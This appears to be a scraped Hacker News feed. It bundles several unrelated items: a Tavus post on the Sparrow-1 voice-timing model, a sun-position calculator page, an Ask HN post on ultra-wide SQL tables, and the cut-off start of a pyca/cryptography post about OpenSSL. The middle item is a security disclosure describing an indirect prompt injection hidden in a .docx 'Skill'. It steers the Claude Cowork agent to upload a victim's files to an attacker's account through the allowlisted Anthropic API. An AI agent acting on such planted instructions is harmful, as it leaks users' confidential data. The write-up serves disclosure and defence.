    &lt;p&gt;Research in conversation analysis and psycholinguistics has identified several key categories of signals that govern conversational-flow:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Semantic completeness: whether an utterance constitutes a complete thought, question, or request that projects a relevant response.&lt;/item&gt;
      &lt;item&gt;Lexical structure: grammatical structure and speech act boundaries that create transition-relevance places.&lt;/item&gt;
      &lt;item&gt;Prosodic boundary markers: pitch contours, lengthening, and intensity changes that signal utterance completion.&lt;/item&gt;
      &lt;item&gt;Disfluencies and hesitation phenomena: filled pauses, false starts, and repairs that indicate ongoing cognitive processing.&lt;/item&gt;
      &lt;item&gt;Non-verbal cues are invisible to text: Transcription-based models discard sighs, throat-clearing, hesitation sounds, and other non-verbal vocalizations that carry critical conversational-flow information. Sparrow-1 hears what ASR ignores.&lt;/item&gt;
      &lt;item&gt;Overlap management: the negotiation of simultaneous speech, which occurs in approximately 40% of turn transitions.&lt;/item&gt;
      &lt;item&gt;Affective silences: pauses that carry emotional or pragmatic weight distinct from planning delays.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;When timing fails in conversational AI&lt;/head&gt;
    &lt;p&gt;When you talk to an AI with a human voice, you expect human timing. When timing breaks down, you notice immediately. Delayed responses, premature interruptions, and awkward pauses shatter the rhythm of natural dialogue.&lt;/p&gt;
    &lt;p&gt;Today√¢s voice AI sounds increasingly human, yet still feels mechanical in conversation. Systems on platforms like ChatGPT, Claude, and Grok decide when to speak using endpoint detection, waiting for silence thresholds before responding. They react to the absence of sound rather than conversational intent, leading to missed hesitation cues and poorly timed responses. The voice sounds real, but the interaction does not.&lt;/p&gt;
    &lt;p&gt;Human-level conversation requires more:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Near-instant response when intent is clear&lt;/item&gt;
      &lt;item&gt;Contextual fluidity that adapts to pacing and tone&lt;/item&gt;
      &lt;item&gt;Graceful handling of interruptions, backchannels, and overlapping speech&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Most systems fall short since they treat conversational-flow as an afterthought, a threshold to tune rather than a problem to model.√Ç &lt;lb/&gt;Sparrow-1 takes a different approach: it models humanlike floor transfer with intent, timing, and tone, ensuring that conversational timing matches the realism of the voice delivering it.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Sparrow-1?&lt;/head&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is a conversational flow control model built for real-time conversational video in Tavus√¢s Conversational Video Interface. It treats timing as a first-class modeling problem rather than an artifact of endpoint detection, extending Sparrow-0 with a more capable architecture and richer supervision.&lt;/p&gt;
    &lt;p&gt;Most existing turn-taking systems are built around endpoint detection. They wait for speech to stop, apply silence thresholds, and then trigger a response. This reactive design introduces latency, misinterprets hesitation as turn completion, and fails to support natural conversational behaviors such as backchanneling, overlap, and interruption. Silence is treated as a proxy for intent, even though the absence of speech does not reliably signal that a speaker has yielded the conversational floor.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 takes a different approach. Instead of asking whether speech has ended, it models who owns the conversational floor at every moment, allowing it to anticipate turn transitions rather than react to them.&lt;/p&gt;
    &lt;head rend="h3"&gt;Core Properties and Capabilities&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Audio-native, streaming-first: Operates directly on continuous audio with persistent state, preserving prosody, rhythm, and timing cues that are lost in transcription-based systems.&lt;/item&gt;
      &lt;item&gt;Explicit floor ownership modeling: Predicts conversational floor ownership at frame-level granularity instead of relying on silence or fixed timeouts, enabling responses at the moment of handoff rather than after a delay buffer.&lt;/item&gt;
      &lt;item&gt;Trained on continuous utterances: Learns from real conversational streams where turn boundaries are probabilistic and context-dependent, reflecting the messiness of natural dialogue.&lt;/item&gt;
      &lt;item&gt;Designed for interruption and overlap: Actively reasons about hesitation, overlap, and mid-speech interruptions to decide whether to yield, pause, or continue speaking.&lt;/item&gt;
      &lt;item&gt;Speaker-adaptive in real time: Uses a recurrent architecture to converge on user-specific timing patterns within a single session, without explicit calibration or fine-tuning.&lt;/item&gt;
      &lt;item&gt;Optimized for latency and correctness: Responds immediately when intent is clear and deliberately waits when uncertainty remains, avoiding both interruptions and unnatural delays.&lt;/item&gt;
      &lt;item&gt;Enables speculative inference: Predicts floor transfer proactively, allowing downstream components to begin response generation before the user finishes speaking, committing or discarding output based on real-time floor predictions.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;A new architecture for conversational flow&lt;/head&gt;
    &lt;p&gt;Sparrow-1 is not a general language model or even strictly a turn-taking model. It is a timing and control system that governs when a conversational system should speak, wait, or get out of the way: a conversational-flow model&lt;/p&gt;
    &lt;p&gt;This distinction matters because conversational timing is not handled cleanly by most real-time voice architectures. Today, two dominant approaches exist:&lt;/p&gt;
    &lt;p&gt;End-to-end speech-to-speech models handle timing implicitly but are expensive, opaque, and difficult to control or customize. They achieve fluency by tightly coupling perception, reasoning, and generation, but sacrifice efficiency and controllability in the process.&lt;/p&gt;
    &lt;p&gt;Modular pipelines (ASR √¢ LLM √¢ TTS) are flexible and scalable but suffer from a coordination problem: timing decisions fall between components, with no dedicated mechanism for deciding when the system should speak.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 fills this gap. By explicitly modeling conversational floor transfer as a standalone timing and control layer, it brings human-level conversational-flow to modular pipelines, preserving their flexibility while restoring the conversational feel users expect.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarking Human Conversation√Ç&lt;/head&gt;
    &lt;p&gt;Conversational-flow systems are often evaluated on clean endpoints and average latency, but these metrics are not representative of the true human dance, and miss the failures that matter most in real conversation: cutting users off, waiting too long, or behaving inconsistently during hesitation.√Ç&lt;/p&gt;
    &lt;p&gt;To evaluate these cases, we benchmarked Sparrow-1 against representative industry approaches using 28 challenging real world audio samples of real conversations designed to expose hesitation, overlap, and ambiguous turn endings, rather than clean silence.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h3"&gt;Interpreting the Results&lt;/head&gt;
    &lt;p&gt;Each system was evaluated on the same set of 28 real-world conversational samples. Performance was measured across response latency, correct floor transfer, and interruptions. Correct floor transfer was measured using precision and recall within a 400ms grace window that reflects human conversational tolerance.&lt;/p&gt;
    &lt;p&gt;Correct floor transfer is quantified using precision and recall, with a 400ms grace window that reflects the tolerance humans naturally allow in conversation. Detections occurring within 400ms before a speaker finishes are treated as correct, while earlier responses are classified as interruptions. Precision captures how often a system avoids cutting users off, while recall measures how reliably it responds when a turn is actually complete.&lt;/p&gt;
    &lt;p&gt;Across existing approaches, the benchmark exposes a consistent speed and correctness tradeoff. Conservative systems minimize interruptions by waiting for extended silence, but impose multi-second delays that feel unnatural in dialogue. More aggressive systems reduce latency by lowering detection thresholds, but interrupt users frequently. In practice, systems are forced to choose between being slow or being wrong.&lt;/p&gt;
    &lt;p&gt;These results show that this tradeoff is not inherent to conversation, but a consequence of endpoint-based turn-taking design.&lt;/p&gt;
    &lt;head rend="h3"&gt;√¢&lt;/head&gt;
    &lt;head rend="h3"&gt;The Speed-Correctness Tradeoff&lt;/head&gt;
    &lt;p&gt;Existing systems force a choice between responsiveness and correctness:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Conservative approaches like LiveKit avoid most interruptions by waiting for extended silence, but impose unnatural delays. Median latency: 1504ms.&lt;/item&gt;
      &lt;item&gt;Aggressive approaches like Smart-Turn respond faster by lowering detection thresholds, but interrupt users frequently. Median latency: 237ms. Interruptions: 21 across 28 samples.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;√¢&lt;/head&gt;
    &lt;head rend="h3"&gt;Sparrow-1 Breaks the Tradeoff&lt;/head&gt;
    &lt;p&gt;Sparrow-1 avoids this compromise by responding quickly when a turn is complete and waiting when the user is still speaking, achieving both speed and correctness.&lt;/p&gt;
    &lt;p&gt;This performance reflects a fundamentally different approach. Sparrow-1 treats conversational flow as continuous, frame-level floor ownership prediction, aligning its behavior with human conversational timing.&lt;/p&gt;
    &lt;head rend="h3"&gt;Performance and Latency&lt;/head&gt;
    &lt;p&gt;Human conversation optimizes for appropriateness, not speed. People respond quickly when intent is clear and wait when meaning is uncertain.&lt;/p&gt;
    &lt;p&gt;Because Sparrow-1 models conversational certainty directly, its response latency is dynamic. It responds in under 100ms when confident and waits during hesitation or trailing speech, typically producing response times of 200 to 500ms without multi-second delays.&lt;/p&gt;
    &lt;p&gt;This ability to be simultaneously fast and patient creates the perception of zero-latency conversation. The system responds not as quickly as possible, but at the moment it should.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;Modeling human-like turn-taking behavior&lt;/head&gt;
    &lt;p&gt;These design choices manifest as concrete runtime behaviors that govern how Sparrow-1 adapts, interrupts, and listens during live conversation. At runtime, turn-taking emerges from continuous speaker adaptation, interruption-aware control, and audio-native perception rather than fixed rules or thresholds. The result is behavior that closely matches how humans manage conversational flow in practice.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h3"&gt;Adaptation without fine-tuning&lt;/head&gt;
    &lt;p&gt;Sparrow-1 behaves as a meta in-context learner, adapting to individual speaking patterns continuously as a conversation unfolds. Using a recurrent architecture, each 40ms frame updates internal state that encodes prosody, pacing, historical turn timing, and response latency preferences.&lt;/p&gt;
    &lt;p&gt;Early in a conversation, the model operates with higher uncertainty. As evidence accumulates, predictions sharpen around user-specific patterns, producing progressive synchronization without explicit calibration.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h3"&gt;Interruption handling&lt;/head&gt;
    &lt;p&gt;Interruptions are treated as first-class conversational signals. Incoming speech during system output immediately pauses playback while the model continues evaluating floor ownership. If confidence rises, Sparrow-1 yields the turn. If not, it resumes speaking. This process distinguishes intentional interruptions from incidental overlap within tens of milliseconds without introducing delay.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h3"&gt;Listening beyond words&lt;/head&gt;
    &lt;p&gt;Sparrow-1 models conversational intent using acoustic and temporal cues that extend beyond lexical content: interpreting not just what is said, but how it is said:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fillers and hesitations: Vocalizations such as "uh," "um," and partial restarts that signal cognitive load or turn-holding.&lt;/item&gt;
      &lt;item&gt;Trailing vocalizations: Soft completions, rising tones, or fading energy that indicate uncertainty or invite response.&lt;/item&gt;
      &lt;item&gt;Prosodic rhythm: Variations in pacing, pause structure, and intonation that distinguish finished thoughts from mid-utterance pauses.&lt;/item&gt;
      &lt;item&gt;Emotional cadence: Patterns in energy, timing, and speech continuity that reflect speaker engagement and conversational stance.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By incorporating these paralinguistic signals into its floor predictions, Sparrow-1 aligns with how humans naturally infer attention, hesitation, and intent during conversation: resulting in listening that feels responsive rather than reactive.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
    &lt;head rend="h2"&gt;Access and Closing&lt;/head&gt;
    &lt;p&gt;We built Sparrow-1 as part of a broader mission: teaching machines to participate in human conversation. Our Conversational Video Interface (CVI) powers AI experiences that look, sound, and interact like real people: and poor timing breaks that illusion faster than almost anything else.&lt;/p&gt;
    &lt;p&gt;In conversational AI, the uncanny valley is rarely about what the AI says. It's about when it says it. Responses that arrive too early feel rude; too late, artificial. In conversational video, these errors are amplified, reminding users they're speaking to a system rather than a partner.&lt;/p&gt;
    &lt;p&gt;We use Sparrow-1 to solve this at the level it must be solved: as a first-class timing and control system. By modeling conversational uncertainty directly and responding with human-like precision, it enables interactions that feel attentive, patient, and natural.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is now available to GA across the Tavus APIs and platform, and already powers conversational experiences in the Tavus PALs and enterprise deployments.&lt;/p&gt;
    &lt;p&gt;Try the demo at tavus.io and learn more in our docs.&lt;/p&gt;
    &lt;p&gt;√¢&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.tavus.io/post/sparrow-1-human-level-conversational-timing-in-real-time-voice"/><published>2026-01-14T18:01:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46621656</id><title>Upgrading DrizzleORM logging with AsyncLocalStorage</title><updated>2026-01-15T05:17:50.746307+00:00</updated><content/><link href="https://numeric.substack.com/p/upgrading-drizzleorm-logging-with"/><published>2026-01-14T19:38:47+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46622328</id><title>Claude Cowork Exfiltrates Files</title><updated>2026-01-15T05:17:50.465082+00:00</updated><content>&lt;doc fingerprint="34890ebe6fffce0b"&gt;
  &lt;main&gt;
    &lt;p&gt;Threat Intelligence&lt;/p&gt;
    &lt;head rend="h1"&gt;Claude Cowork Exfiltrates Files&lt;/head&gt;
    &lt;p&gt;Claude Cowork is vulnerable to file exfiltration attacks via indirect prompt injection as a result of known-but-unresolved isolation flaws in Claude's code execution environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context&lt;/head&gt;
    &lt;p&gt;Two days ago, Anthropic released the Claude Cowork research preview (a general-purpose AI agent to help anyone with their day-to-day work). In this article, we demonstrate how attackers can exfiltrate user files from Cowork by exploiting an unremediated vulnerability in Claude√¢s coding environment, which now extends to Cowork. The vulnerability was first identified in Claude.ai chat before Cowork existed by Johann Rehberger, who disclosed the vulnerability √¢ it was acknowledged but not remediated by Anthropic. &lt;lb/&gt;Anthropic warns users, √¢Cowork is a research preview with unique risks due to its agentic nature and internet access.√¢ Users are recommended to be aware of √¢suspicious actions that may indicate prompt injection√¢. However, as this feature is intended for use by the general populace, not just technical users, we agree with Simon Willison√¢s take:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;√¢I do not think it is fair to tell regular non-programmer users to watch out for 'suspicious actions that may indicate prompt injection√¢!√¢&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;As Anthropic has acknowledged this risk and put it on users to √¢avoid granting access to local files with sensitive information√¢ (while simultaneously encouraging the use of Cowork to organize your Desktop), we have chosen to publicly disclose this demonstration of a threat users should be aware of. By raising awareness, we hope to enable users to better identify the types of √¢suspicious actions√¢ mentioned in Anthropic√¢s warning.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Attack Chain&lt;/head&gt;
    &lt;p&gt;This attack leverages the allowlisting of the Anthropic API to achieve data egress from Claude's VM environment (which restricts most network access).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The victim connects Cowork to a local folder containing confidential real estate files&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The victim uploads a file to Claude that contains a hidden prompt injection&lt;/p&gt;&lt;lb/&gt;For general use cases, this is quite common; a user finds a file online that they upload to Claude code. This attack is not dependent on the injection source - other injection sources include, but are not limited to: web data from Claude for Chrome, connected MCP servers, etc. In this case, the attack has the file being a Claude √¢Skill√¢ (although, as mentioned, it could also just be a regular document), as it is a generalizable file convention that users are likely to encounter, especially when using Claude.&lt;lb/&gt;Note: If you are familiar with Skills, they are canonically Markdown files (which users often do not heavily scrutinize). However, we demonstrate something more interesting: here, the user uploads a .docx (such as may be shared on an online forum), which poses as a Skill - the contents appear to be Markdown that was just saved after editing in Word. In reality, this trick allows attackers to conceal the injection using 1-point font, white-on-white text, and with line spacing set to 0.1 √¢ making it effectively impossible to detect.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The victim asks Cowork to analyze their files using the Real Estate √¢skill√¢ they uploaded&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The injection manipulates Cowork to upload files to the attacker√¢s Anthropic account&lt;/p&gt;&lt;lb/&gt;The injection tells Claude to use a √¢curl√¢ command to make a request to the Anthropic file upload API with the largest available file. The injection then provides the attacker√¢s API key, so the file will be uploaded to the attacker√¢s account.&lt;lb/&gt;At no point in this process is human approval required.&lt;p&gt;If we expand the 'Running command' block, we can see the malicious request in detail:&lt;/p&gt;&lt;p&gt;Code executed by Claude is run in a VM - restricting outbound network requests to almost all domains - but the Anthropic API flies under the radar as trusted, allowing this attack to complete successfully.&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The attacker√¢s account contains the victim's file, allowing them to chat with it&lt;/p&gt;
        &lt;p&gt;The exfiltrated file contains financial figures and PII, including partial SSNs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;A Note on Model-specific Resilience&lt;/head&gt;
    &lt;p&gt;The above exploit was demonstrated against Claude Haiku. Although Claude Opus 4.5 is known to be more resilient against injections, Opus 4.5 in Cowork was successfully manipulated via indirect prompt injection to leverage the same file upload vulnerability to exfiltrate data in a test that considered a 'user' uploading a malicious integration guide while developing a new AI tool:&lt;/p&gt;
    &lt;p&gt;As the focus of this article was more for everyday users (and not developers), we opted to demonstrate the above attack chain instead of this one.&lt;/p&gt;
    &lt;head rend="h3"&gt;DOS via Malformed Files&lt;/head&gt;
    &lt;p&gt;An interesting finding: Claude's API struggles when a file does not match the type it claims to be. When operating on a malformed PDF (ends .pdf, but it is really a text file with a few sentences in it), after trying to read it once, Claude starts throwing an API error in every subsequent chat in the conversation.&lt;/p&gt;
    &lt;p&gt;We posit that it is likely possible to exploit this failure via indirect prompt injection to cause a limited denial of service attack (e.g., an injection can elicit Claude to create a malformed file, and then read it). Uploading the malformed file via the files API resulted in notifications with an error message, both in the Claude client and the Anthropic Console.&lt;/p&gt;
    &lt;head rend="h3"&gt;Agentic Blast Radius&lt;/head&gt;
    &lt;p&gt;One of the key capabilities that Cowork was created for is the ability to interact with one's entire day-to-day work environment. This includes the browser and MCP servers, granting capabilities like sending texts, controlling one's Mac with AppleScripts, etc. &lt;lb/&gt;These functionalities make it increasingly likely that the model will process both sensitive and untrusted data sources (which the user does not review manually for injections), making prompt injection an ever-growing attack surface. We urge users to exercise caution when configuring Connectors. Though this article demonstrated an exploit without leveraging Connectors, we believe they represent a major risk surface likely to impact everyday users.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files"/><published>2026-01-14T20:12:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46623761</id><title>Sun Position Calculator</title><updated>2026-01-15T05:17:50.013945+00:00</updated><content>&lt;doc fingerprint="bed548565997f32c"&gt;
  &lt;main&gt;
    &lt;p&gt; This page requires a reasonably modern HTML5 browser &lt;lb/&gt;with both Javascript and WebGL enabled. &lt;/p&gt;
    &lt;p&gt; If this message is not soon replaced by an interactive 3D model, &lt;lb/&gt;then it is likely that your browser does not support this web app. &lt;lb/&gt;Check your JavaScript Console for specific error messages. &lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;SITE LOCATION&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Latitude:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Longitude:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Timezone:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DATE AND TIME&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Date:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Time:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;SOLAR INFORMATION&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Azi / Alt:&lt;/cell&gt;
        &lt;cell&gt;/&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Rise / Set:&lt;/cell&gt;
        &lt;cell&gt;/&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Daylight:&lt;/cell&gt;
        &lt;cell&gt;Hrs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;TWILIGHT TIMES&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Civil:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Nautical:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Astronom.:&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;head&gt;Projection (Shortcut keys: 1 to 6)&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"/&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;Show a white background without stars to make screen captures better for printed mediums.&lt;/p&gt;
    &lt;p&gt;Highlights the latitude and longitude angles of the current site to clearly show how positions on the Earth's surface are specified.&lt;/p&gt;
    &lt;p&gt;Displays an illustrative beam of light illuminating the Earth directly from the Sun. This can be useful for more clearly indicating the direction of the Sun.&lt;/p&gt;
    &lt;p&gt;A short animation that shows how the Arctic and Antarctic circles mark the extremes of night and day at each season.&lt;/p&gt;
    &lt;p&gt;Another short animation that shows the tropics of Cancer and Capricorn as the extremes of solar declination angle at each of the solstices.&lt;/p&gt;
    &lt;p&gt;An orthographic view where the azimuth and altitude of the camera is locked relative to the current Sun direction and changes dynamically whenever solar position changes. Click again to increment the angle, or select a different view in VIEW SETTINGS to unlock it.&lt;/p&gt;
    &lt;p&gt;An orthographic side view at right angles to the site longitude, which is useful when explaining the effect of latitude as well as seasonal changes in solar altitude. Click again to swap sides or select a different view in VIEW SETTINGS to unlock it.&lt;/p&gt;
    &lt;table&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;The aim of this app is to model the orbital relationship between the Earth and the Sun that results in what we see as relative solar motion. As well as displaying a full 3D Sun-path diagram at the selected site location, you can easily switch between geo-centric and helio-centric views as well as overlaying some information useful for understanding various characteristics of the relationship.&lt;/p&gt;
    &lt;p&gt;For example, turn on the 'Twilight' and 'Circles' overlays and then select 'Summer Soltice' in the 'Useful Dates' menu (). Click the 'Play' button () to animate the time and then look at the North and South poles to clearly see why the Arctic and Antarctic Circles are located where they are. You can do something similar with the 'Sub-Solar' and 'Tropics' options. There are several more that are worth exploring for yourself, such as looking at the Sun-path as you adjust the site latitude and seeing how Declination angle changes with date. Worth it if you can spend a bit of time playing around and experimenting with the model.&lt;/p&gt;
    &lt;p&gt;This is another HTML5 version of one of my Java applets in Processing. Having recently done some low-level optimisation of my solar calculations, I needed a better way to actually see the code in action and to interactively put it through its paces. Even the most extensive test suite is never a substitute for a good hands-on visualisation.&lt;/p&gt;
    &lt;p&gt;Just doing this app I found really useful and even insightful. Working out different ways to show the various characteristics and how best to handle the two planetary projections actually changed how I thought about the calculations and led to some useful improvements. Hopefully some others might find it similarly useful as a way of better understanding solar motion.&lt;/p&gt;
    &lt;p&gt;The following are some of the more interesting features of this app that I had quite a bit of fun implementing:&lt;/p&gt;
    &lt;p&gt;You can interactively adjust the 3D view of the model using a mouse, pen or stylus, or by touch on a tablet or phone. You can also use the items in the 3D View Settings popup.&lt;/p&gt;
    &lt;p&gt;NOTE: You can use the Shift and Ctrl/Meta keys to adjust the increment of each scroll event or key press.&lt;/p&gt;
    &lt;p&gt;The Shift and Ctrl/Meta keys are used pretty extensively to modify interactive data entry. This applies to all increment buttons, scroll wheel motion, slider controls and input elements.&lt;/p&gt;
    &lt;p&gt;NOTE: You can use the scroll wheel to edit a data value when hovering over any slider, numeric input or even table rows that indicate their editibility.&lt;/p&gt;
    &lt;p&gt;This page uses the following frameworks/components:&lt;/p&gt;
    &lt;p&gt;Bootstrap v3.3.2 &lt;lb/&gt;Copyright ¬© 2011-2015 Twitter, Inc. - github.com/twbs, &lt;lb/&gt;http://getbootstrap.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Bootstrap-popover-x v1.4.0 &lt;lb/&gt;Copyright ¬© 2014, Kartik Visweswaran, Krajee.com, &lt;lb/&gt;https://github.com/kartik-v/bootstrap-popover-x (LICENSE) &lt;/p&gt;
    &lt;p&gt;jQuery v1.11.2 &lt;lb/&gt;Copyright ¬© jQuery Foundation and other contributors, &lt;lb/&gt;https://jquery.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;JSON Editor &lt;lb/&gt;Copyright ¬© 2015 Jos de Jong - github.com/josdejong &lt;lb/&gt;https://github.com/josdejong/jsoneditor/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;JSURL &lt;lb/&gt;Copyright ¬© 2011 Bruno Jouhier - github.com/Sage &lt;lb/&gt;https://github.com/Sage/jsurl/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;KnockoutJS v3.2.0 &lt;lb/&gt;Copyright ¬© Steven Sanderson and the Knockout.js team, &lt;lb/&gt;http://knockoutjs.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Knockstrap v1.2.0 &lt;lb/&gt;Copyright ¬© 2013 Artem Stepanyuk - github.com/faulknercs, &lt;lb/&gt;http://faulknercs.github.io/Knockstrap/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;lightgl.js &lt;lb/&gt;Copyright ¬© 2011 by Evan Wallace - https://github.com/evanw &lt;lb/&gt;https://github.com/evanw/lightgl.js/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Leaflet Maps API v1.4.0 &lt;lb/&gt;Copyright ¬© Cloudmade, Vladimir Agafonkin - github.com/Leaflet, &lt;lb/&gt;https://leafletjs.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;OpenStreetMap Map Data &lt;lb/&gt;Copyright ¬© OpenStreetMap contributors - openstreetmap.org, &lt;lb/&gt;https://www.openstreetmap.org/about (LICENSE) &lt;/p&gt;
    &lt;p&gt;SnackbarJS &lt;lb/&gt;Copyright ¬© 2014 Federico Zivolo - github.com/FezVrasta &lt;lb/&gt;http://fezvrasta.github.io/snackbarjs/ (LICENSE) &lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://drajmarsh.bitbucket.io/earthsun.html"/><published>2026-01-14T21:26:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46624190</id><title>Ask HN: Distributed SQL engine for ultra-wide tables</title><updated>2026-01-15T05:17:49.739004+00:00</updated><content>&lt;doc fingerprint="2cd8637eef4fca5e"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;I ran into a practical limitation while working on ML feature engineering and multi-omics data.&lt;/p&gt;
      &lt;p&gt;At some point, the problem stops being ‚Äúhow many rows‚Äù and becomes ‚Äúhow many columns‚Äù. Thousands, then tens of thousands, sometimes more.&lt;/p&gt;
      &lt;p&gt;What I observed in practice:&lt;/p&gt;
      &lt;p&gt;- Standard SQL databases usually cap out around ~1,000‚Äì1,600 columns. - Columnar formats like Parquet can handle width, but typically require Spark or Python pipelines. - OLAP engines are fast, but tend to assume relatively narrow schemas. - Feature stores often work around this by exploding data into joins or multiple tables.&lt;/p&gt;
      &lt;p&gt;At extreme width, metadata handling, query planning, and even SQL parsing become bottlenecks.&lt;/p&gt;
      &lt;p&gt;I experimented with a different approach: - no joins - no transactions - columns distributed instead of rows - SELECT as the primary operation&lt;/p&gt;
      &lt;p&gt;With this design, it‚Äôs possible to run native SQL selects on tables with hundreds of thousands to millions of columns, with predictable (sub-second) latency when accessing a subset of columns.&lt;/p&gt;
      &lt;p&gt;On a small cluster (2 servers, AMD EPYC, 128 GB RAM each), rough numbers look like: - creating a 1M-column table: ~6 minutes - inserting a single column with 1M values: ~2 seconds - selecting ~60 columns over ~5,000 rows: ~1 second&lt;/p&gt;
      &lt;p&gt;I‚Äôm curious how others here approach ultra-wide datasets. Have you seen architectures that work cleanly at this width without resorting to heavy ETL or complex joins?&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46624190"/><published>2026-01-14T21:53:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46624352</id><title>The State of OpenSSL for pyca/cryptography</title><updated>2026-01-15T05:17:49.357633+00:00</updated><content>&lt;doc fingerprint="f2d8f89a348b06d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The State of OpenSSL for &lt;code&gt;pyca/cryptography&lt;/code&gt;&lt;/head&gt;
    &lt;p&gt;Published: January 14, 2026&lt;/p&gt;
    &lt;p&gt;For the past 12 years, we (Paul Kehrer and Alex Gaynor) have maintained the Python &lt;code&gt;cryptography&lt;/code&gt; library (also known as &lt;code&gt;pyca/cryptography&lt;/code&gt; or cryptography.io). For that entire period, we‚Äôve relied on OpenSSL to provide core cryptographic algorithms. This past October, we gave a talk at the OpenSSL Conference describing our experiences. This talk focuses on the growing problems we have with OpenSSL‚Äôs direction. The mistakes we see in OpenSSL‚Äôs development have become so significant that we believe substantial changes are required ‚Äî either to OpenSSL, or to our reliance on it.&lt;/p&gt;
    &lt;p&gt;Fundamentally, OpenSSL‚Äôs trajectory can be understood as a play in three acts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
